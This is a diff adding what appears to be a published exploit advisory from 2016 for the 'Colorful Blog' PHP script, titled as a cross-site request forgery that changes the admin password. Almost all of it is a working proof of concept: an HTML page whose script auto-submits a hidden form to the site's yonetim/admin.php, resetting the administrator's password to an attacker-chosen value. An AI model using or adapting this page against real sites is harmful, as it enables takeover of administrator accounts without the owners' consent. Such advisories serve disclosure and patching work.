@@ -1,0 +1,33 @@
+# Exploit Title :----------- : Colorful Blog - Cross-Site Request Forgery  (Change Admin Pass)
+# Author :------------------ : Besim
+# Google Dork :---------- :  -
+# Date :--------------------- : 13/10/2016
+# Type :--------------------- : webapps
+# Platform :---------------- : PHP  
+# Vendor Homepage :-- : -
+# Software link :---------- : http://wmscripti.com/php-scriptler/colorful-blog-scripti.html
+
+
+Description : 
+
+You can change admin's password with CSRF, if you know admin's username
+
+########################### CSRF PoC ###############################
+
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <form action="http://site_name/path/yonetim/admin.php" method="POST">
+      <input type="hidden" name="username" value="admin_username" />
+      <input type="hidden" name="password" value="besim" />
+      <input type="hidden" name="gonder" value="Kaydet" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+
+####################################################################
